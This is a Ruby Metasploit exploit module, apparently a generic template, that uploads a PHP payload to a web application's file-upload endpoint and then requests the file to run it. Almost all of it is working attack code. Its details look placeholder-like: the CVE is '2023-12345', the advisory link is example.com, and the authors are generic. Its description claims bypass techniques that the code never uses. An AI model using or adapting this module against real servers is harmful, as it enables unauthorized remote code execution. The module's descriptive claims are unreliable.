##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'File Upload Vulnerability Exploit',
        'Description' => %q{
          This module exploits an insecure file upload vulnerability that allows
          arbitrary file upload without proper validation. The application fails
          to properly validate file extensions and content types, allowing an
          attacker to upload and execute malicious PHP code on the target system.
          
          The vulnerability exists in the file upload functionality where user-supplied
          files are not properly sanitized, enabling bypass of weak security controls
          through various techniques such as double extensions, null byte injection,
          or MIME type manipulation.
        },
        'Author' => [
          'Security Researcher',
          'Module Developer'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-12345'],
          ['URL', 'https://example.com/advisory'],
          ['EDB', '50000']
        ],
        'DisclosureDate' => '2023-06-15',
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [
          [
            'Automatic',
            {}
          ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2023-06-15'
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The base path to the vulnerable application', '/upload']),
        OptString.new('FILEPATH', [false, 'The destination path for uploaded file', '/uploads/'])
      ]
    )
  end

  def check
    # Send a test request to verify the upload endpoint exists
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )

    unless res
      return CheckCode::Unknown('No response from target')
    end

    if res.code == 200 && res.body =~ /upload|file/i
      return CheckCode::Appears('Upload endpoint detected')
    elsif res.code == 200
      return CheckCode::Detected('Target is reachable but vulnerability uncertain')
    else
      return CheckCode::Safe('Upload endpoint not found')
    end
  rescue ::Rex::ConnectionError
    return CheckCode::Unknown('Failed to connect to the target')
  end

  def exploit
    print_status("Generating payload filename...")
    filename = generate_filename

    print_status("Creating multipart form data...")
    data = create_multipart_data(filename)

    print_status("Uploading malicious file: #{filename}")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data.to_s
    )

    unless res
      fail_with(Failure::Unreachable, 'No response received from target')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Upload failed with response code: #{res.code}")
    end

    print_good("File uploaded successfully")

    # Parse response to determine upload location
    upload_path = parse_upload_location(res, filename)

    print_status("Attempting to trigger payload at: #{upload_path}")

    # Trigger the uploaded payload
    trigger_res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(upload_path)
    )

    unless trigger_res
      fail_with(Failure::Unreachable, 'Failed to trigger uploaded payload')
    end

    if trigger_res.code == 200
      print_good("Payload executed successfully!")
      register_file_for_cleanup(upload_path)
    else
      print_warning("Unexpected response code when triggering payload: #{trigger_res.code}")
    end
  end

  def generate_filename
    # Generate random filename with PHP extension
    random_name = Rex::Text.rand_text_alpha(8)
    "#{random_name}.php"
  end

  def create_multipart_data(filename)
    # Create multipart MIME message for file upload
    data = Rex::MIME::Message.new
    
    # Add the file part with encoded payload
    data.add_part(
      payload.encoded,
      'application/octet-stream',
      nil,
      "form-data; name=\"file\"; filename=\"#{filename}\""
    )
    
    # Add any additional form fields if needed
    data.add_part('', nil, nil, 'form-data; name="submit"')
    
    data
  end

  def parse_upload_location(response, filename)
    # Attempt to extract upload location from response
    if response.body =~ /uploaded to\s+([^\s<]+)/i
      return $1
    elsif response.body =~ /success.*?['"]([^'"]+#{Regexp.escape(filename)}[^'"]*)['"]/i
      return $1
    else
      # Default to configured filepath if parsing fails
      filepath = datastore['FILEPATH'] || '/uploads/'
      return normalize_uri(filepath, filename)
    end
  end

  def normalize_uri(*args)
    # Ensure proper URI formatting
    uri = args.join('/')
    uri.gsub!('//', '/')
    uri = '/' + uri unless uri.start_with?('/')
    uri
  end

end